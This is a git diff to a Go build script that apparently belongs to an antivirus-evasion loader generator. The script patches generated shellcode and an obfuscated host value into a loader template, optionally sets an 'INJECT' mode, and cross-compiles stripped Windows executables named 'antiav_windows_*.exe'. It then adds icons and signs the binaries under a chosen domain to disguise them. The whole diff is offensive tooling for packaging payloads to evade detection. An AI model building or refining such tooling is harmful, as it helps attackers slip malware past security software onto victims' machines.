@@ -1,12 +1,10 @@
 package main
 
 import (
-	"bytes"
 	"fmt"
 	"io/ioutil"
 	"math/rand"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"runtime"
 	"strings"
@@ -19,11 +17,13 @@ import (
 var (
 	buildDir = filepath.Join("dist", "_tmp")
 	copyCmd  = "cp"
+	export   = "export"
 )
 
 func init() {
 	if runtime.GOOS == "windows" {
 		copyCmd = "copy"
+		export = "set"
 	}
 	rand.Seed(time.Now().UnixNano())
 }
@@ -35,58 +35,68 @@ func (c *config) build() {
 		logrus.Error(err.Error())
 		return
 	}
-	logrus.Info("[*] generated Code Done.")
+	logrus.Info("[*] Generated Code Done.")
 	if err := c.buildCode(code); err != nil {
 		logrus.Error(err.Error())
 		return
 	}
-	logrus.Info("[*] build Done")
+	logrus.Info("[*] Build Done")
 }
 
-func (c *config) buildCode(key []byte) error {
+func (c *config) buildCode(code []byte) error {
+	//初始化临时目录
 	os.RemoveAll(buildDir)
 	os.Mkdir(buildDir, 0755)
-
-	if err := c.cmd(fmt.Sprintf("%s loader/%s/* %s/", copyCmd, c.loader, buildDir)); err != nil {
+	if err := utils.Cmd(fmt.Sprintf("%s %s %s", copyCmd, filepath.Join("loader", c.loader, "*.go"), buildDir)); err != nil {
 		return err
 	}
 
+	//切换到临时目录编译
 	os.Chdir(buildDir)
-	sc, err := ioutil.ReadFile("sc.go")
-	if err != nil {
+
+	ref := Ref{
+		CODE:            string(code),
+		HOST_OBFUSCATOR: c.hostObfuscator,
+		HACK:            "NORMAL",
+	}
+	if c.inject {
+		ref.HACK = "INJECT"
+	}
+
+	if err := c.payloadPatch(&ref, "sc.go"); err != nil {
 		return err
 	}
-	code := bytes.ReplaceAll(sc, []byte("{{CODE}}"), key)
-	code = bytes.ReplaceAll(code, []byte("{{HOST_OBFUSCATOR}}"), []byte(c.hostObfuscator))
-	if err := ioutil.WriteFile("sc.go", code, 0755); err != nil {
+
+	if err := c.compile(); err != nil {
 		return err
 	}
-	switch c.os {
-	case "windows":
-		ldflag := "-w -s"
-		utils.CreateIcoPropertity("386")
-		cmd := fmt.Sprintf(`CGO_ENABLED=1 CC=i686-w64-mingw32-gcc GOOS=windows GOARCH="386" go build -ldflags "%s" -trimpath -o "../antiav_windows_386.exe"`, ldflag)
-		if err := c.cmd(cmd); err != nil {
+
+	return nil
+}
+
+func (c *config) compile() error {
+	buildFlag := `-a -gcflags=-trimpath=$GOPATH -asmflags=-trimpath=$GOPATH  -trimpath -ldflags "-s -w"`
+	archs := []string{"amd64", "386"}
+	compiler := map[string]string{
+		"amd64": "x86_64-w64-mingw32-gcc",
+		"386":   "i686-w64-mingw32-gcc",
+	}
+	for _, arch := range archs {
+		utils.CreateIcoPropertity(arch)
+		output := fmt.Sprintf("../antiav_windows_%s.exe", arch)
+		cmd := fmt.Sprintf(`
+			%s CGO_ENABLED=1 && 
+			%s CC=%s &&
+			%s GOOS=windows && 
+			%s GOARCH="%s" && 
+			go build %s -o %s`,
+			export, export, compiler[arch], export, export, arch, buildFlag, output)
+		if err := utils.Cmd(cmd); err != nil {
 			return err
 		}
 		os.Remove("resource_windows.syso")
-		utils.SignExecutable(c.domain, "../antiav_windows_386.exe")
-
-		utils.CreateIcoPropertity("amd64")
-		cmd = fmt.Sprintf(`CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc GOOS=windows GOARCH="amd64" go build -ldflags "%s" -trimpath -o "../antiav_windows_amd64.exe"`, ldflag)
-		if err := c.cmd(cmd); err != nil {
-			return err
-		}
-		os.Remove("resource_windows.syso")
-		utils.SignExecutable(c.domain, "../antiav_windows_amd64.exe")
-	case "linux":
-		cmd := `CGO_ENABLED=1 GOOS=linux GOARCH="amd64" go build -ldflags "-w -s" -trimpath -o "../antiav_linux_amd64"`
-		if err := c.cmd(cmd); err != nil {
-			return err
-		}
-		utils.SignExecutable(c.domain, "../antiav_linux_amd64")
+		utils.SignExecutable(c.domain, output)
 	}
-
 	return nil
 }
 
@@ -118,20 +128,4 @@ func (c *config) genCode() ([]byte, error) {
 	}
 
 	return []byte(strings.Join(codeBuf, ",")), nil
-}
-
-func (c *config) cmd(cmd string) error {
-	var sh *exec.Cmd
-	if runtime.GOOS == "windows" {
-		sh = exec.Command("cmd", "/C", cmd)
-	} else {
-		sh = exec.Command("sh", "-c", cmd)
-	}
-	sh.Stdin = os.Stdin
-	sh.Stdout = os.Stdout
-	sh.Stderr = os.Stderr
-	if err := sh.Run(); err != nil {
-		return err
-	}
-	return nil
 }
